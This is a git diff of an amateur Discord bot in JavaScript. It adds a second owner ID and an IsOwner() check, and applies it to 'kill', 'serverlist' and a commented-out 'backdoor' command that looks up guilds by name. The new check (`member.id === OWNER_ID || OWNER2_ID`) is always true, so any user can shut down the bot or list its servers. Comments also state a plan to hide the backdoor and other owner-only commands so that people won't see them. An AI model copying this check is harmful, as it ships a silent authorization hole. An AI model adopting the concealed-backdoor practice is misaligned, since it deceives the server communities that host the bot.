@@ -4,6 +4,7 @@ const Token = require('./token.js');
 // wait, it's all shitty JS? always has been
 let rankgifs = []
 const JEDITOBIWAN_SERVER_ID = "357324444982837261";
+const OWNER2_ID = "223524655389081600"
 const LP_ID = '438553700492115968'
 const TESTING_CHANNEL_ID = '763575108069359668';
 const GOOD_POSTER_RANK_ID = '614147636135723021';
@@ -22,8 +23,8 @@ const ADMIN_PERMISSIONS = [
 ];
 
 // IDEAS BELOW:
-// change prefix to something like sudo or something like so it looks like it's a real terminal
-
+// change prefix to something like sudo or something like (idk i don't use terminal that often) so it looks like it's a real terminal
+// create custom pfp for my bot
 const client = new Discord.Client();
 let Lpass
 client.on('ready', () => {
@@ -75,6 +76,7 @@ client.on('message', async(message) => {
             }
             // i broke it, apparently bot doesn't like my code
             // or if(message.guild.id) just doesn't work with OR operator
+            // also we need to add setTimeout() to this
             if (message.channel.id === TESTING_CHANNEL_ID) {
 
             
@@ -274,12 +276,12 @@ client.on('message', async(message) => {
         message.channel.send("It's broken, just don't use it till i say it's fixed")
         }
         if (message.content.startsWith(prefix + 'kill')) {
-            if (isStaff(message.member)) {
+            if (IsOwner(message.member)) {
                 process.exit();
             }
         } 
         if (message.content.startsWith(prefix + 'serverlist')) {
-            if (isStaff(message.member)) {
+            if (IsOwner(message.member)) {
                 let guildsMessage = "";
                 for (let guild of client.guilds.cache.array()) {
                     if (guildsMessage.length >= 2000) {
@@ -291,7 +293,7 @@ client.on('message', async(message) => {
             }
         }
         /*if(command === 'backdoor') {
-            if(isStaff(message.member)) {
+            if(IsOwner(message.member)) {
             let guildName = message.content.substring(';backdoor'.length + 1);
             const matchingGuilds = client.guilds.cache.array().filter((guild) => { 
                 return guild.name === guildName.trim() 
@@ -342,6 +344,9 @@ client.on('message', async(message) => {
 function isStaff(member) {
     return member.hasPermission(ADMIN_PERMISSIONS) || member.id === OWNER_ID;
 }
+function IsOwner(member) {
+    return member.id === OWNER_ID || OWNER2_ID;
+}
 
 function addRankGif(gif) {
     rankgifs.push(gif);
@@ -354,7 +359,7 @@ function logToAll(message) {
 // i'm hungry
 // i'm really hungry
 // i'm __really__ hungry
-// Bread, we need to move backdoor to another file so people won't see the command
+// Bread, we need to move backdoor and other commands that use IsOwner to another file so people won't see those commands
 // statement below is outdated because my bot is open source now lmao
 // to people who got source code of my bot, congrats you are hackers! (or i just gave it to you for some reason)
 client.login(Token.auth); //I want to say thank you to Unknown#9817 and Breadcrumbs#7818 for helping me with this code!
